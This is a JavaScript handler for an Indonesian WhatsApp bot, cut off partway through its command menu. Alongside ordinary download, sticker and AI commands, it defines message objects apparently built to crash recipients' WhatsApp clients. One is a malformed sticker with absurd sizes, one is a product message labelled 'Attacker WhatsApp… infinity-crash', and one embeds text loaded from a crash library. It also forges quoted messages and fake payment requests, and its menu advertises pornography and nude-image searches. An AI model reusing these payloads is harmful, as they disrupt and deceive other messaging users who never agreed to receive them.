require('./config')
const { WA_DEFAULT_EPHEMERAL, extractImageThumb, getAggregateVotesInPollMessage, URL_REGEX, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = global.baileys
const fs = require('fs')
const util = require('util')
let fetch = require('node-fetch');
const PDFDocument = require('pdfkit')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const cheerio = require('cheerio')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const yts = require('yt-search')
const { JSDOM } = require('jsdom')
const { color, bgcolor } = require('./lib/color')
const maker = require('mumaker')
const textpro = require('./lib/textpro')
const { tizi } = require('./lib/tizi');
const { weg } = require('./lib/weg');
const { vapi } = require('./lib/vapi.js');
const { philips } = require('./lib/philips.js');
const { apikey } = require('./apikey.json')
const { uptotelegra } = require('./lib/upload')
const { Primbon } = require('scrape-primbon')
const { Brainly } = require("brainly-scraper-v2");
const { translate } = require("@vitalets/google-translate-api")
const { Pixiv } = require('@ibaraki-douji/pixivts')
const pixiv = new Pixiv()
const googleTTS = require('google-tts-api')
const ytdl = require("ytdl-core")
const speed = require('performance-now')
const path = require('path')
const primbon = new Primbon()
const { Configuration, OpenAIApi } = require('openai')
const { exec, spawn, execSync } = require("child_process")
const { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
const { smsg, formatp, hitungmundur, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, generateProfilePicture, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const { fetchBuffer, buffergif } = require("./lib/myfunc2")

const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json'))
const pengguna = JSON.parse(fs.readFileSync('./database/user.json'))
const docunye = JSON.parse(fs.readFileSync('./database/docu.json'))
const zipnye = JSON.parse(fs.readFileSync('./database/zip.json'))
const apknye = JSON.parse(fs.readFileSync('./database/apk.json'))
const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))
const ntilinkall =JSON.parse(fs.readFileSync('./lib/antilinkall.json'))
let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'));
let ntilinkchannel =JSON.parse(fs.readFileSync('./database/antilinkchannelwa.json'));
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'))
let nteval = JSON.parse(fs.readFileSync('./database/antieval.json'))
let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))
const banned = JSON.parse(fs.readFileSync('./database/banned.json'))
const thumb = fs.readFileSync(`./image/lol.jpg`)
const virusgambar = fs.readFileSync(`./image/virgam.jpeg`)


module.exports = conn = async (conn, m, chatUpdate, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype === 'messageContextInfo') ? (m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix


const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()//Kalau mau Single prefix Lu ganti pake ini = const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const arg = budy.slice(command.length + 2, budy.length)
const pushname = m.pushName || "No Name"
const botNumber = await conn.decodeJid(conn.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
let text = q = args.join(" ")
const { type, quotedMsg, mentioned, now, fromMe } = m
const { chats } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
const isPrem = prem.includes(m.sender)
const from = mek.key.remoteJid
const groupMetadata = m.isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const welcm = m.isGroup ? wlcm.includes(from) : false
const welcmm = m.isGroup ? wlcmm.includes(from) : false
const AntiLink = m.isGroup ? ntilink.includes(from) : false
const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
const AntiLinkChannel = m.isGroup ? ntilinkchannel.includes(from) : false
const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
const AntiEval = m.isGroup ? nteval.includes(from) : false
const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
const isBan = banned.includes(m.sender)
const content = JSON.stringify(m.message)
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const Input = mentionByTag[0] ? mentionByTag[0] : q ? numberQuery : false
const wita = moment(Date.now()).tz('Asia/Makassar').locale('id').format('HH:mm:ss z')
const wit = moment(Date.now()).tz('Asia/Jayapura').locale('id').format('HH:mm:ss z')
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const tanggal = moment(Date.now()).tz("Asia/Makassar").locale('id').format("dddd, ll")
const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const qtod = m.quoted? "true":"false"
const vn = true
const timestampi = speed();
const latensii = speed() - timestampi
const ini_mark = `0@s.whatsapp.net`
const dnew = new Date(Date.now())
const week = dnew.toLocaleDateString('in', {
               weekday: 'long'
            })
            const weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(dnew / 84600000) % 5]
            const date = dnew.toLocaleDateString('in', {
               day: 'numeric',
               month: 'long',
               year: 'numeric'
            })
            const dateIslamic = Intl.DateTimeFormat('in' + '-TN-u-ca-islamic', {
               day: 'numeric',
               month: 'long',
               year: 'numeric'
            }).format(dnew)
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')
         if(time2 < "23:59:00"){
var shinchantime = `Selamat Malam 🌌`
 }
 if(time2 < "19:00:00"){
var shinchantime = `Selamat Malam 🌃`
 }
 if(time2 < "18:00:00"){
var shinchantime = `Selamat Sore 🌃`
 }
 if(time2 < "15:00:00"){
var shinchantime = `Selamat Sore 🌅`
 }
 if(time2 < "11:00:00"){
var shinchantime = `Selamat Siang 🌄`
 }
 if(time2 < "05:00:00"){
var shinchantime = `Selamat Pagi 🌄`
 } 
//fake quoted
const ftroli = {
         key: {
            fromMe: false,
            "participant": "0@s.whatsapp.net",
            "remoteJid": "status@broadcast"
         },
         "message": {
            orderMessage: {
               itemCount: 7777777,
               status: 200,
               surface: 200,
               message: `© ${ownername}`,
               orderTitle: 'memek',
               sellerJid: '0@s.whatsapp.net'
            }
         },
         contextInfo: {
            "forwardingScore": 999,
            "isForwarded": true
         },
         sendEphemeral: true
      }
const fkontak = {
         key: {
            participant: `0@s.whatsapp.net`,
            ...(from ? {
               remoteJid: `status@broadcast`
            } : {})
         },
         message: {
            'contactMessage': {
               'displayName': `${pushname}`,
               'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
               'jpegThumbnail': thumb,
               thumbnail: thumb,
               sendEphemeral: true
            }
         }
      }
      const fbugstik = {
key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AnrD-A1QmqzujA1cup-mlu8IZA25t9JgmpQepFY9Rn6z.enc'",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 999999999,
"width": 999999999,
"directPath": "/v/t62.15575-24/30929805_648615486894459_9146693700573396349_n.enc?ccb=11-4&oh=01_AVwP9-aotKL3M5xo84ruYmFJof6hpjvTaHtWrOLdvzhkxw&oe=632E77C8",
"fileLength": "999999999",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}
const fbugtoko = {
key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
"productMessage": {
"product": {
"productImage":{
"mimetype": "image/jpeg",
"jpegThumbnail": thumb //Gambarnye
},
"title": `👿ᴬᵗᵗᵃᶜᵏᵉʳ ᵂʰᵃᵗˢᴬᵖᵖ👿`, //Kasih namalu 
"description": "⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡᴀ", 
"retailerId": "XD",
"productImageCount": 999999999
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}
const fbugtext = {
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: {
        "extendedTextMessage": {
        "text": `${weg}\n${weg}`
        }
        }
        }
const blue = { 
key: {
            fromMe: false,
            "participant": "0@s.whatsapp.net",
            "remoteJid": "status@broadcast"
         },
'message': {
"interactiveMessage": {
"body": {
"text": `${ownername}`,
"hasMediaAttachment": [],
"jpegThumbnail": thumb,
},
"nativeFlowMessage": {
"buttons": [
				{
"name": "review_and_pay",
"buttonParamsJson": '{"currency":"IDR","total_amount":{"value":2023,"offset":100},"reference_id": "6348642505244872","order":{"status": "completed","items":[{"retailer_id": "6348642505244872","name": "","amount":{"value":10000,"offset":100},"quantity":7777777}]}}'
}
]
}
}}}
const fpayment = {
         key: {
            fromMe: false,
            "participant": "0@s.whatsapp.net",
            "remoteJid": "status@broadcast"
         },
         message: {
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "10000000000",
"requestFrom": m.sender,
"noteMessage": {
"extendedTextMessage": {
"text": `𝙎𝙃𝙄𝙉𝘾𝙃𝘼𝙉 メ 𝙒𝙄𝘽𝙐𝙎𝙊𝙁𝙏`,
}
}}}}
const shinuwu = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
'message': {
"interactiveMessage": {
"header": {
"hasMediaAttachment": [],
"jpegThumbnail": thumb,
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": '{"currency":"USD","payment_configuration":"","payment_type":"","transaction_id":"","total_amount":{"value":879912500,"offset":100},"reference_id":"4N88TZPXWUM","type":"physical-goods","payment_method": "","order":{"status":"pending","description":"","subtotal":{"value":990000000,"offset":100},"tax":{"value":8712000,"offset":100},"discount":{"value":118800000,"offset":100},"shipping":{"value":500,"offset":100},"order_type":"ORDER","items":[{"retailer_id":"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0","name":"ShinChan","amount":{"value":1000000,"offset":100},"quantity":99},{"retailer_id":"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4","name":"Anak","amount":{"value":5000000,"offset":100},"quantity":99},{"retailer_id":"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3","name":"Ganteng","amount":{"value":4000000,"offset":100},"quantity":99}]},"additional_note":"anu"}',
contextInfo:{mentionedJid:[sender]}
}
]
}
}
}}
//===================SHINCHAN XD=========================//
if (vn) {
let allct = await store.chats.all().map(v => v.id)
if (m.message && m) {
if (vn === false) return
for (let jid of allct) {
conn.sendPresenceUpdate('composing', jid)
setTimeout(() => {
conn.sendPresenceUpdate('composing', jid)
}, 25000)
setTimeout(() => {
conn.sendPresenceUpdate('composing', jid)
}, 50000)
setTimeout(() => {
conn.sendPresenceUpdate('composing', jid)
}, 75000)
setTimeout(() => {
conn.sendPresenceUpdate('composing', jid)
}, 95000)
}
}
}
//===================SHINCHAN XD=========================//
const paycall = (teks) => {
var scheduledCallCreationMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": 'call',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `${teks}`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(m.chat, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
/*const paytod = (teks) => {
let me = m.sender
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "INR",
"amount1000": "10000000000",
"requestFrom": m.sender,
"noteMessage": {
"extendedTextMessage": {
"text": `${teks}`,
}
}}}), { userJid: m.chat, quoted: fkontak })
conn.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}*/
const paytod = (teks) => {
var paymentod = {
    requestPaymentMessage: {
      currencyCodeIso4217: 'INR',
      amount1000: 99999 * 1000,
      requestFrom: m.sender,
      noteMessage: {
      extendedTextMessage: {
      text: teks,
      contextInfo: {
      mentionedJid: [m.sender],
      externalAdReply: {
      showAdAttribution: true
      }}}}}}
      conn.relayMessage(m.chat, paymentod, {})
      }
//===================REPLY NYA=========================//
const reply = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), fileLength: 999999999999999, mimetype: `${docs}`, fileName: `𝙏𝙐𝙉𝙂𝙂𝙐 𝙔𝘼🤗`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/0e2b5f224fdcaf4b61d02.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: blue})}
const replybrainly = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), fileLength: 999999999999999, mimetype: `${docs}`, fileName: `𝘽𝙍𝘼𝙄𝙉𝙇𝙔📖`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/8cd68dfc3fa902010e0e6.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: blue})}
const replyhentai = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), fileLength: 999999999999999, mimetype: `${docs}`, fileName: `🥵𝙉𝙃𝙀𝙉𝙏𝘼𝙄 𝙎𝙀𝘼𝙍𝘾𝙃🥵`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/b2d62575b1b5cadaeb1e2.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: blue})}
const replyerror = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), fileLength: 999999999999999, mimetype: `${docs}`, fileName: `𝙔𝘼𝙃 𝙀𝙍𝙍𝙊𝙍😭`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `𝙀𝙍𝙍𝙊𝙍 404 𝘽𝙔: ${global.ownername}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/39ebef0bfdf46f18cb2ff.png',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: blue})} 
const ytreply = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), fileLength: 999999999999999, mimetype: `${docs}`, fileName: `🐼𝙔𝙊𝙐𝙏𝙐𝘽𝙀 𝙎𝙀𝘼𝙍𝘾𝙃🐼`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/97f426edef5a6326065a9.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: blue})} 
const spotifyreply = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), fileLength: 999999999999999, mimetype: `${docs}`, fileName: `🐣𝙎𝙋𝙊𝙏𝙄𝙁𝙔 𝙎𝙀𝘼𝙍𝘾𝙃🐣`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://www.scdn.co/i/_global/open-graph-default.png',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: blue})} 

const replybokep = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), fileLength: 999999999999999, mimetype: `${docs}`, fileName: `🥵𝙓𝙉𝙓𝙓 𝙎𝙀𝘼𝙍𝘾𝙃🥵`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/6bdd8ea22025d0afe0497.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: blue})} 
const replyxvideos = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), fileLength: 999999999999999, mimetype: `${docs}`, fileName: `🥵𝙓𝙑𝙄𝘿𝙀𝙊𝙎 𝙎𝙀𝘼𝙍𝘾𝙃🥵`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/dd0982ab9d4d655335a7d.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: blue})} 
const replysimi = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), fileLength: 999999999999999, mimetype: `${docs}`, fileName: `🐣𝗔𝗸𝘂 𝙎𝙞𝙢𝙎𝙞𝙢𝙞🐣`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/25cc613088dbb0bf49bae.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: m})} 
const replyguru = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), fileLength: 999999999999999, mimetype: `${docs}`, fileName: `📖𝗥𝗢𝗕𝗢𝗧 𝗚𝗨𝗥𝗨📖`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/7f3f33cee047a2c20854b.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: m})} 
const replydltt = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), fileLength: 999999999999999, mimetype: `${docs}`, fileName: `𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿𝙄𝙉𝙂 𝙏𝙄𝙆𝙏𝙊𝙆...`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/00636535720e2815a9868.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: m})} 
//==========================================================//

function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}
//document randomizer
let documents = [doc1,doc2,doc3,doc4,doc5,doc6,doc7,doc8,doc9,doc10,doc11,doc12,doc13]
let docs = pickRandom(documents)

//menu nya
stod = `${sender}`
var mundur = await hitungmundur(4, 23)
const menulist = `*Hay ${pushname} 👋*
${shinchantime}
Saya ©ɴᴇʀᴏʙᴏᴛ yang di buat oleh developer ${global.ownername} untuk membantu para pengguna WhatsApp
━━━━━━━━━━━━━━━━━━━
╰┈➤「 \`\`\`𝑫𝑨𝑻𝑨𝑩𝑨𝑺𝑬\`\`\` 」
━━━━━━━━━━━━━━━━━━━
_Status : ${isCreator ? 'Owner' : 'User'}_
_Nama : ${pushname}_
_Nomor : @${stod.split('@')[0]}_
_Sponsored :  @${ini_mark.split('@')[0]}_
Prefix :   ${prefix}
_Speed : ${latensii.toFixed(4)} Second_
Memory Used : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
Hostname : ${os.hostname()}
Platform : ${os.platform()}
Type : Node.Js
Baileys : @whiskeysockets/baileys@^6.5.0
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝑹𝑬𝑨𝑳 𝑻𝑰𝑴𝑬 )
━━━━━━━━━━━━━━━━━━━
𝐇𝐚𝐫𝐢: ${week} ${weton}
𝐓𝐚𝐧𝐠𝐠𝐚𝐥: ${date}
𝐉𝐚𝐦: ${time}
𝐉𝐚𝐦: ${wita}
𝐉𝐚𝐦: ${wit}
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝑰𝑫𝑼𝑳 𝑭𝑰𝑻𝑹𝑰 🌜 )
━━━━━━━━━━━━━━━━━━━
 ${mundur}
 Hijriah : ${dateIslamic}
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿 )
━━━━━━━━━━━━━━━━━━━
➤ mediafire (link MediaFire)
➤ pixiv (perlu code pixiv)
➤ spotify (link Spotify)
➤ nhentai/ncode (code hentai)
➤ xnxx/xnxxdl (link bokep xnxx)
➤ xvideos/xvideosdl (link bokep xvideos)
➤ tiktok (link)
➤ tiktokmp3 (link)
➤ ttimg/tiktokslide/ttslide (link)
➤ igdl (link)
➤ igvid/igvideo (link video ig)
➤ igimg/igfoto (link foto ig)
➤ dlcapcut (link)
➤ twitter/twt/twtdl (Link Video Twitter)
➤ fbdl (Link Video Facebook)
➤ telestik (Link Stiker Telegram)
➤ play (cari lagu apa?)
➤ ytmp3 (link yt)
➤ ytmp4 (link yt)
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝘼𝙄 & 𝙀𝙉𝘾𝙃𝘼𝙉𝙏 )
━━━━━━━━━━━━━━━━━━━
➤ ai/openai
➤ simi
➤ loli
➤ neko
➤ waifu
➤ remini (reply gambar)
➤ 4k (reply gambar)
➤ removebg (reply gambar)
➤ jadianime (Reply Gambar)
➤ txtimg (masukin prompt)
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝙏𝙊𝙊𝙇𝙎 𝙈𝙀𝙉𝙐 )
━━━━━━━━━━━━━━━━━━━
➤ enc/encsc (Kirim Code Script Js lu)
➤ npmsearch
➤ persamaankata/sinonim
➤ style/styletext
➤ ringtone
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝘼𝙄 𝙆𝙃𝙐𝙎𝙐𝙎 𝙊𝙒𝙉𝙀𝙍 )
━━━━━━━━━━━━━━━━━━━
➤ aijs (Ai generate code JavaScript)
➤ aipy (Ai generate code Python)
➤ nero (Ai Khusus Coding V1)
➤ neroai (Ai Khusus Coding V2)
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝙋𝙀𝙉𝘾𝘼𝙍𝙄𝘼𝙉 )
━━━━━━━━━━━━━━━━━━━
➤ spotifysearch (search)
➤ xnxxsearch (search)
➤ xvideosearch (search)
➤ ytsearch (search)
➤ pinterest (search)
➤ google (search)
➤ img (Nyari foto bugil, Nezuko nude|jumlahnya)
➤ wallpaper (search)
➤ wallpaper2
➤ carihentai (Lu mo nyari apa?)
➤ nekopoi (Masukin Judul Nekopoi, Contoh: Majo wa kekkyoku sono kyaku)
➤ anime (Cari Sinopsis Anime)
➤ lirik (Judul lagu indo)
➤ lirik2 (Judul lagu luar negeri)
➤ search (Mencari Source Anime+Manga)
➤ searchmusik (Mencari Judul Musik)
➤ imdb (Cek Rating Film)
➤ wikipedia
➤ yandere (Query)
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝘼𝙇𝘼𝙏 𝘽𝘼𝙉𝙏𝙐 )
━━━━━━━━━━━━━━━━━━━
➤ mtk (kirim soal mtk)
➤ aksarajawa
➤ latin (translate aksara jawa)
➤ ocr (Ambil Teks Foto)
➤ brainly (Kirim Soal)
➤ ruangguru/roboguru (Kirim Soal)
➤ translate ( [id] Teks )
➤ kalkulator
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝘽𝙐𝘼𝙏 𝙀𝙈𝘼𝙄𝙇 𝙍𝘼𝙉𝘿𝙊𝙈 )
━━━━━━━━━━━━━━━━━━━
➤ tempmail
➤ inboxemail/inboxmail (Masukin ID Email)
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝙎𝙏𝙄𝙆𝙀𝙍 )
━━━━━━━━━━━━━━━━━━━
➤ ttp
➤ ttp2
➤ ttp3
➤ ttp4
➤ ttp5
➤ attp
➤ attp2
➤ sticker
➤ qc (Masukan Teks)
➤ smeme (reply gambar)
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝘾𝙊𝙉𝙑𝙀𝙍𝙏 )
━━━━━━━━━━━━━━━━━━━
➤ toimg
➤ take/wm
➤ toaudio
➤ tomp3
➤ togif
➤ tovn
